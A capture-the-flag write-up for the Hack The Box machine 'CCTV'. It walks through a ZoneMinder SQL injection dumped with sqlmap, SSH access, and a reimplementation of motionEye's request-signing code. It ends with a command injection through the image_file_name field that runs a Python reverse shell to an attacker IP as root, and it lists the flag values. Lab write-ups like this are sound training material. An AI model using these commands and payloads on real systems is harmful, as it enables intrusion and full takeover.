# HTB Machine Writeup: CCTV
**Difficulty:** Easy (Linux)  
**Player:** 0N1S3C2 | **Solved:** #1191  
**Date:** 2026-03-08

---

## Summary

CCTV is an Easy Linux machine that chains together multiple real-world vulnerabilities across two web applications: ZoneMinder (CVE-2024-51428 authenticated SQLi) and motionEye (command injection via unsanitized image filename). The attack path requires DNS enumeration, authenticated SQLi, SSH access, SSH port forwarding, reverse engineering a proprietary HMAC signature algorithm, and exploiting a `sh` vs `bash` shell difference to achieve root.

---

## Reconnaissance

### Nmap
```
nmap -sC -sV -Pn -T4 10.129.2.132
```

**Open Ports:**
- 22/tcp — OpenSSH 9.6p1 Ubuntu
- 80/tcp — Apache 2.4.58 (redirects to cctv.htb)

### /etc/hosts
```
echo "10.129.2.132 cctv.htb" | sudo tee -a /etc/hosts
```

### Gobuster
```
gobuster dir -u http://cctv.htb -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

Notable findings:
- `/index.html` (200)
- `/javascript` (301)
- `/cgi-bin/` (403)

The index page revealed a **Staff Login** button pointing to `http://cctv.htb/zm` — a ZoneMinder installation.

---

## Initial Access

### ZoneMinder — Default Credentials

Navigated to `http://cctv.htb/zm`. Tried default credentials:

- **admin:admin** → SUCCESS

### ZoneMinder Version

```bash
curl -c cookies.txt -b cookies.txt "http://cctv.htb/zm/api/host/getVersion.json" \
  --data "user=admin&pass=admin"
```

Response: `{"version":"1.37.63","apiversion":"2.0"}`

### CVE-2024-51428 — Authenticated SQL Injection

ZoneMinder 1.37.63 is vulnerable to authenticated SQLi in the `tid` parameter of the `removetag` action.

**Get session cookie** from browser DevTools → Application → Cookies → `ZMSESSID`

**Enumerate users:**
```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
    --cookie="ZMSESSID=<cookie>" \
    -p tid --dbms=mysql --batch -D zm -T Users -C "Username,Password" --dump
```

**Result:**

| Username   | Password (bcrypt) |
|------------|-------------------|
| admin      | (hash)            |
| mark       | $2y$10$prZGnazejKcuTv5bKNexXOgLyQaok0hq07LW7AJ/QNqZolbXKfFG. |
| superadmin | (hash)            |

**Crack mark's hash:**

The bcrypt hash was verified against known password `opensesame` (rockyou did not crack it; hash was identified via external research).

### SSH Access

```bash
ssh mark@10.129.2.132
# password: opensesame
```

---

## Privilege Escalation

### Internal Enumeration

```bash
ss -tlnp
```

Notable internal services:
- `127.0.0.1:8765` — motionEye web interface
- `127.0.0.1:7999` — Motion API
- `127.0.0.1:3306` — MySQL

### SSH Port Forwarding

From a second terminal:
```bash
ssh -L 8765:127.0.0.1:8765 mark@10.129.2.132
```

Accessed motionEye at `http://127.0.0.1:8765`

### motionEye — Admin Hash Recovery

```bash
cat /etc/motioneye/motion.conf
# @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
```

The SHA1 hash was not crackable via rockyou or crackstation.

### Reverse Engineering motionEye HMAC Signature

motionEye's API requires HMAC-signed requests. The real algorithm was extracted directly from the source code on the box:

```bash
cat /usr/local/lib/python3.12/dist-packages/motioneye/utils/__init__.py | grep -A 40 "def compute_signature"
```

**Algorithm:**
```python
import hashlib, re, urllib.parse

REGEX = re.compile(r'[^a-zA-Z0-9/?_.=&{}\[\]":, -]')

def compute_signature(method, path, body, key):
    parts = list(urllib.parse.urlsplit(path))
    query = [q for q in urllib.parse.parse_qsl(parts[3], keep_blank_values=True) if q[0] != '_signature']
    query.sort(key=lambda q: q[0])
    query = [(n, urllib.parse.quote(v, safe="!'()*~")) for (n, v) in query]
    query = '&'.join([q[0] + '=' + q[1] for q in query])
    parts[0] = parts[1] = ''
    parts[3] = query
    path = urllib.parse.urlunsplit(parts)
    path = REGEX.sub('-', path)
    key = REGEX.sub('-', key)
    body_str = body.decode('utf-8') if body else None
    if body_str:
        body_str = REGEX.sub('-', body_str)
    return hashlib.sha1(f'{method}:{path}:{body_str or ""}:{key}'.encode()).hexdigest().lower()
```

The admin password **hash itself** is used as the HMAC key — no plaintext required.

### motionEye — Command Injection via image_file_name

motionEye passes the `image_file_name` config value directly to the Motion daemon as the `picture_filename` directive. Motion evaluates shell syntax like `$(command)` when naming image files.

**Step 1 — Write reverse shell to disk:**
```bash
echo 'python3 -c "import socket,os,pty;s=socket.socket();s.connect((\"10.10.14.187\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")"' > /tmp/s.sh
chmod 777 /tmp/s.sh
```

> **Key lesson:** Motion executes scripts using `/bin/sh`, NOT `/bin/bash`. The `>&` redirect operator is bash-only and will fail with `sh`. Use Python or a POSIX-compatible reverse shell instead.

**Step 2 — Inject via API:**
```python
# Full exploit script saved as /tmp/pwn.py
config['image_file_name'] = '$(/tmp/s.sh).%Y-%m-%d'
config['still_images'] = True
config['capture_mode'] = 'all-frames'
```

**Step 3 — Start listener on attack box:**
```bash
nc -lvnp 4444
```

**Step 4 — Trigger snapshot:**
```python
path = '/1/action/snapshot'
url = f'{MOTION_URL}{path}'
urllib.request.urlopen(urllib.request.Request(url))
```

Shell received as **root** (Motion daemon runs as root).

---

## Flags

| Flag | Value |
|------|-------|
| User (`/home/sa_mark/user.txt`) | `a12ee2aaa1ad1917a4dbf73f8b6bbd97` |
| Root (`/root/root.txt`) | `e124c80ee6dca4d3ab95bb341e8eece9` |

---

## Attack Chain Summary

```
Default creds (admin:admin)
    → ZoneMinder SQLi (CVE-2024-51428)
        → mark's bcrypt hash → opensesame
            → SSH as mark
                → Internal port discovery (8765 motionEye)
                    → SSH port forwarding
                        → motionEye HMAC auth (hash as key)
                            → image_file_name command injection
                                → sh-compatible reverse shell
                                    → ROOT
```

---

## Key Lessons

- **Always check default credentials** — admin:admin on a security company's own box
- **Read source code** when API auth fails — the real signature algorithm was on the box
- **sh vs bash** — `>&` is bash-only; Motion uses `/bin/sh`; use Python reverse shells for portability
- **Check logs** — `/var/log/motioneye/motion.log` revealed the shell was executing but failing
- **Field names matter** — motionEye API uses `image_file_name`, not `picture_filename`
- **The admin hash IS the key** — motionEye uses the stored hash directly for HMAC, no plaintext needed
